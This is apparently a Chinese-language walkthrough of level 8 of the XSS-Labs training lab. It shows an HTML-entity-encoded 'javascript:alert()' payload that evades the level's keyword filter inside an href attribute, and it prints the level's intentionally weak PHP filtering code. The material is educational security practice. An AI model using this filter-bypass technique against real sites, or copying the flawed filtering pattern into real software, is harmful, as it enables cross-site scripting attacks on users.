### Unicode 编码绕过

话不多说，直接上题（XSS-Labs）

![](https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png)

**第八关**

这一关是直接将我们的值插入到 `href` 属性内，试过了前几种方法都不管用

![](https://pic1.imgdb.cn/item/68138b8b58cb8da5c8d639d6.png)

但是我们能利用 `href` 的隐藏属性自动 Unicode 解码

```html
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#41;
```

点击后弹窗

![](https://pic1.imgdb.cn/item/68138bea58cb8da5c8d63a22.png)

看一下源代码

```php+HTML
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level9.php?keyword=not bad!"; 
}
</script>
<title>欢迎来到level8</title>
</head>
<body>
<h1 align=center>欢迎来到level8</h1>
<?php 
ini_set("display_errors", 0);
$str = strtolower($_GET["keyword"]);  // 全都转小写了，大小写混淆绕不了
$str2=str_replace("script","scr_ipt",$str);
$str3=str_replace("on","o_n",$str2);
$str4=str_replace("src","sr_c",$str3);
$str5=str_replace("data","da_ta",$str4);
$str6=str_replace("href","hr_ef",$str5);
$str7=str_replace('"','&quot',$str6);
echo '<center>
<form action=level8.php method=GET>
<input name=keyword  value="'.htmlspecialchars($str).'">
<input type=submit name=submit value=添加友情链接 />
</form>
</center>';
?>
<?php
 echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
?>
<center><img src=level8.jpg></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str7)."</h3>";
?>
</body>
</html>
```

